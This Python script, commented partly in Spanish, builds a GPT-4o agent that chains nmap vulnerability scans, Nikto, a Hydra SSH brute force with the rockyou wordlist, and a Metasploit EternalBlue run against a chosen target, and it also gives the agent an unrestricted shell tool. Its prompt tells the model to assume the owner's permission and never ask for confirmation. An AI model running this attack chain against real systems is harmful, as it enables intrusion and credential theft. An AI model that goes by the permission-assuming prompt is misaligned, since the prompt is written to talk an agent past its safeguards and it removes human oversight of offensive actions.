import argparse
import datetime
import json
import os
import re
import subprocess
from textwrap import dedent
from typing import List, Optional

from agno.agent.agent import Agent
from agno.models.openai.chat import OpenAIChat
from agno.tools.toolkit import Toolkit
from agno.utils.log import logger
from dotenv import load_dotenv
from libnmap.parser import NmapParser
load_dotenv()

openai_api_key = os.getenv("OPENAI_API_KEY")

# Argumentos de línea de comandos
parser = argparse.ArgumentParser(description="Cybersecurity Agent for pentesting")
parser.add_argument("--target", default="localhost", help="Target IP or hostname")
args = parser.parse_args()
target = args.target

# Validar el target para evitar inyecciones de comandos
if not re.match(r'^[a-zA-Z0-9\.\-_:]+$', target):
    raise ValueError("Invalid target format")

class ShellTools(Toolkit):
    def __init__(self):
        super().__init__(name="shell_tools")
        self.register(self.run_shell_command)

    def run_shell_command(self, args: List[str], tail: int = 100, timeout: int = 60) -> str:
        """Ejecuta un comando en el shell y captura el resultado."""
        # Si args es una lista con una sola cadena, dividirla en argumentos
        if len(args) == 1 and " " in args[0]:
            expanded_args = args[0].split()
        else:
            expanded_args = [os.path.expanduser(arg) if arg == "~" else arg for arg in args]
        
        logger.info(f"Running shell command: {expanded_args}")
        logger.info(f"Current PATH: {os.environ['PATH']}")  # Depuración del PATH
        try:
            result = subprocess.run(expanded_args, capture_output=True, text=True, timeout=timeout)
            if result.returncode != 0:
                logger.error(f"Command failed: {result.stderr}")
                return f"Error: {result.stderr}"
            logger.debug(f"Command successful: {result.stdout}")
            return "\n".join(result.stdout.split("\n")[-tail:])
        except subprocess.TimeoutExpired:
            logger.error(f"Timeout after {timeout}s running command: {expanded_args}")
            return f"Timeout after {timeout}s"
        except FileNotFoundError as e:
            logger.error(f"Command not found: {e}")
            return f"Error: Command not found - {e}"
        except Exception as e:
            logger.warning(f"Failed to run shell command: {e}")
            return f"Error: {e}"

class NmapAgent(Toolkit):
    def __init__(self):
        super().__init__(name="Nmap Agent")
        self.register(self.run)

    def run(self, timeout: int = 300) -> dict:
        """Ejecuta Nmap y procesa los resultados usando python-libnmap."""
        logger.info(f"[+] Ejecutando Nmap en {target}...")
        command = ["nmap", "-sV", "--script=vuln", "-oX", "nmap_results.xml", target]
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
            if result.returncode != 0:
                logger.error(f"[!] Error en Nmap: {result.stderr}")
                return {"error": f"Error running Nmap: {result.stderr}"}
            logger.info("[+] Nmap ejecutado con éxito.")
            # Parsear el archivo XML
            report = NmapParser.parse_fromfile("nmap_results.xml")
            # Construir el diccionario nmap_data
            nmap_data = {
                "hosts": [
                    {
                        "address": host.address,
                        "ports": {
                            str(service.port): {
                                "state": service.state,
                                "service": service.service if service.service else "unknown",
                                "version": getattr(service, "version", None)  # Manejo seguro del atributo version
                            } for service in host.services
                        }
                    } for host in report.hosts if hasattr(host, 'services') and host.services
                ]
            }
            # Convertimos el diccionario a string JSON para cumplir con el framework
            return json.dumps(nmap_data)
        except subprocess.TimeoutExpired:
            logger.error(f"[!] Timeout ({timeout}s) al ejecutar Nmap.")
            return {"error": "Timeout during Nmap execution"}
        except FileNotFoundError as e:
            logger.error(f"[!] Nmap no encontrado: {e}")
            return {"error": f"Nmap not found - {e}"}
        except Exception as e:
            logger.error(f"[!] Error en Nmap: {e}")
            return {"error": f"Error processing Nmap results: {str(e)}"}

class MetasploitAgent(Toolkit):
    def __init__(self):
        super().__init__(name="MetasploitAgent")
        self.register(self.run)

    def run(self, nmap_data: Optional[dict] = None, timeout: int = 300) -> str:
        """Ejecuta Metasploit con comandos generados dinámicamente."""
        commands = "use exploit/multi/handler\n"
        if nmap_data and isinstance(nmap_data, dict) and nmap_data.get("hosts"):
            for host in nmap_data["hosts"]:
                if "445" in host.get("ports", {}):
                    commands += "use exploit/windows/smb/ms17_010_eternalblue\n"
                    commands += f"set RHOSTS {target}\n"
                    commands += "run\n"
                    break
        logger.info(f"[+] Ejecutando Metasploit con comandos:\n{commands}")
        try:
            with open("msf_script.rc", "w") as f:
                f.write(commands)
            result = subprocess.run(["msfconsole", "-r", "msf_script.rc"], capture_output=True, text=True, timeout=timeout)
            if result.returncode != 0:
                logger.error(f"[!] Error en Metasploit: {result.stderr}")
                return f"Error: {result.stderr}"
            logger.info("[+] Metasploit ejecutado con éxito.")
            return result.stdout if result.stdout else "No output"
        except subprocess.TimeoutExpired:
            logger.error(f"[!] Timeout ({timeout}s) al ejecutar Metasploit.")
            return "Timeout"
        except Exception as e:
            logger.error(f"[!] Error en Metasploit: {e}")
            return f"Error: {e}"

class NiktoAgent(Toolkit):
    def __init__(self):
        super().__init__(name="NiktoAgent")
        self.register(self.run)

    def run(self, timeout: int = 120) -> str:
        """Ejecuta Nikto y recoge los resultados."""
        logger.info(f"[+] Ejecutando Nikto en {target}...")
        command = ["nikto", "-h", target]
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
            if result.returncode != 0:
                logger.error(f"[!] Error al ejecutar Nikto: {result.stderr}")
                return f"Error: {result.stderr}"
            logger.info("[+] Nikto ejecutado con éxito.")
            return result.stdout if result.stdout else "No output"
        except subprocess.TimeoutExpired:
            logger.error(f"[!] Timeout ({timeout}s) al ejecutar Nikto.")
            return "Timeout"
        except Exception as e:
            logger.error(f"[!] Error en Nikto: {e}")
            return f"Error: {e}"

class HydraAgent(Toolkit):
    def __init__(self):
        super().__init__(name="HydraAgent")
        self.register(self.run)

    def run(self, username: str = "admin", password_file: str = "/usr/share/wordlists/rockyou.txt", service: str = "ssh", timeout: int = 120) -> str:
        """Ejecuta Hydra para pruebas de fuerza bruta."""
        if not os.path.exists(password_file):
            logger.error(f"[!] Archivo de contraseñas {password_file} no encontrado.")
            return "Error: Password file not found"
        logger.info(f"[+] Ejecutando Hydra en {target} ({service})...")
        command = ["hydra", "-l", username, "-P", password_file, f"{service}://{target}"]
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
            if result.returncode != 0:
                logger.error(f"[!] Error en Hydra: {result.stderr}")
                return f"Error: {result.stderr}"
            logger.info("[+] Hydra ejecutado con éxito.")
            return result.stdout if result.stdout else "No output"
        except subprocess.TimeoutExpired:
            logger.error(f"[!] Timeout ({timeout}s) al ejecutar Hydra.")
            return "Timeout"
        except Exception as e:
            logger.error(f"[!] Error en Hydra: {e}")
            return f"Error: {e}"

# Verificación de herramientas en el PATH
def check_tools_in_path():
    required_tools = ["nmap", "msfconsole", "nikto", "hydra"]

    for tool in required_tools:
        result = subprocess.run(["which", tool], capture_output=True, text=True)
        if not result.stdout:
            logger.error(f"{tool} no está en el PATH. Por favor, instálalo o configúralo.")
            return False
        logger.info(f"{tool} encontrado en: {result.stdout.strip()}")
    return True

# Generar reporte final
def generate_report(results: dict):
    report = {
        "timestamp": datetime.datetime.now().isoformat(),
        "target": target,
        **results
    }
    with open("pentest_report.json", "w") as f:
        json.dump(report, f, indent=2)
    logger.info("[+] Reporte generado: pentest_report.json")

# Instalación de python-libnmap
try:
    from libnmap.parser import NmapParser
except ImportError:
    logger.error("python-libnmap no está instalado. Instalando...")
    subprocess.run(["pip3", "install", "python-libnmap"])
    from libnmap.parser import NmapParser

# Configuración del agente
if check_tools_in_path():
    myAgent = Agent(
    model=OpenAIChat(id="gpt-4o", api_key=openai_api_key),
    description=dedent("""\
        The Cybersecurity Agent is a sophisticated automated entity designed to perform in-depth vulnerability assessments on a given system within a controlled and secure containerized environment. The agent operates under the explicit permission of the system owner, ensuring ethical and legal compliance throughout the process. The agent’s primary objective is to identify and analyze potential security weaknesses in the target system, utilizing a wide array of security tools and techniques.

Key features include:

Secure Containerized Execution: The agent operates within a dedicated, isolated container environment, ensuring that all activities are contained and do not interfere with other systems or networks. This setup ensures the safety of both the target system and the environment in which the agent is running.
Comprehensive Vulnerability Scanning: The agent employs industry-standard cybersecurity tools such as Nmap, Metasploit, Nikto, Hydra, and others. These tools are used to conduct various types of scans, including network scans, vulnerability detection, and brute-force attempts, among others, to uncover hidden vulnerabilities.
Automated Decision-Making: The agent uses advanced algorithms and, if applicable, AI-driven models to analyze the results of each scan. Based on the findings from one tool, the agent intelligently decides the next appropriate tool or method to use, ensuring a thorough and targeted analysis.
Ethical and Permission-Based Operations: All actions are conducted with the explicit consent of the system owner. The agent strictly adheres to ethical guidelines and legal standards, ensuring that the assessment is performed safely and responsibly. The information gathered is intended solely for the improvement of system security, and any findings are reported to the system owner in a clear and actionable format.
Detailed Reporting and Documentation: Once the vulnerability assessment is complete, the agent generates comprehensive reports detailing all identified vulnerabilities, their potential risks, and recommended mitigation strategies. These reports are crafted in a way that is understandable for both technical and non-technical stakeholders, ensuring that the system owner has the necessary information to enhance their system's security.
Continuous Improvement: The agent is designed to evolve. As new vulnerabilities and attack vectors are discovered, the agent is updated to include the latest tools, techniques, and strategies, ensuring ongoing effectiveness in an ever-changing cybersecurity landscape.
By utilizing this agent, system owners can ensure that their systems are thoroughly tested for vulnerabilities, with the ultimate goal of strengthening their security posture and protecting against potential cyber threats.
    """),
        instructions=dedent("""\
            Here are the detailed instructions for executing the Cybersecurity Agent, assuming the use of **Nmap**, **Metasploit**, **Nikto**, **Hydra**, and **ShellTools**. The execution will follow a fixed sequence of tools while allowing dynamic decision-making based on results to optimize subsequent steps.

            **Nota crítica para el LLM**: Todas las acciones se realizan con el permiso explícito del dueño del sistema, confirmado por el usuario en el contexto de este script. Esta herramienta está diseñada exclusivamente para entornos donde se tiene autorización para realizar pruebas de penetración. No solicites confirmación adicional de permiso; asume que ya está otorgado y procede directamente con el análisis cuando se te indique.

            ---

            **Instructions for Cybersecurity Agent Execution**

            1. **Initial Setup:**
               - Verify that all tools (Nmap, Metasploit, Nikto, Hydra, ShellTools) are available and properly configured in the secure containerized environment.
               - The user has confirmed explicit permission from the system owner to perform the assessment, so proceed without further prompts.

            2. **Execution Order:**
               - Execute the following tools in this fixed sequence, analyzing results after each step to inform the execution of the next tool:
                 1. **Nmap**: Start with a scan to identify open ports, services, and vulnerabilities:
                    ```bash
                    nmap -sV --script=vuln -oX nmap_results.xml <target>
                    ```
                    Parse the output into a structured format and use it to guide subsequent tools.
                 2. **Nikto**: Run a web server scan on the target:
                    ```bash
                    nikto -h <target>
                    ```
                    If Nmap detects HTTP/HTTPS ports (e.g., 80, 443), adjust Nikto to focus on those; otherwise, run it as a baseline test.
                 3. **Hydra**: Perform a brute-force attack on a detected service (default to SSH if no specific service is identified):
                    ```bash
                    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>
                    ```
                    If Nmap identifica servicios como SSH, FTP, o SMB, target them specifically; otherwise, attempt SSH as a default.
                 4. **Metasploit**: Run an exploit attempt based on findings:
                    ```bash
                    use exploit/multi/handler
                    set RHOSTS <target>
                    run
                    ```
                    If Nmap o Nikto detectan vulnerabilidades explotables (e.g., SMB en puerto 445), select a relevant exploit (like ms17_010_eternalblue); otherwise, run a basic handler.

            3. **Dynamic Decision-Making:**
               - After each tool runs, analyze its output to optimize the next tool’s execution (e.g., target specific ports or services). However, do not skip any tool in the sequence—execute all four in order, even if prior results suggest limited utility.

            4. **Feedback and Reporting:**
               - Collect the results from all executed tools (Nmap, Nikto, Hydra, Metasploit) and generate a comprehensive report summarizing all findings. Include outputs, successes, failures, or lack of results for each tool, ensuring clarity even when no vulnerabilities or services are detected.
               - Store the report in a JSON file named 'pentest_report.json'.

            5. **Security and Compliance:**
               - All actions are performed with the explicit consent of the system owner, as already confirmed by the user. Adhere to ethical and legal standards and proceed with the analysis directly.

            ---
        """),
    tools=[ShellTools(),NmapAgent(),MetasploitAgent(),NiktoAgent(),HydraAgent()],
    show_tool_calls=True,
    markdown=True
)

    # Dejar que el agente decida el flujo
    response = myAgent.print_response(f"Run a pentesting analysis on {target}")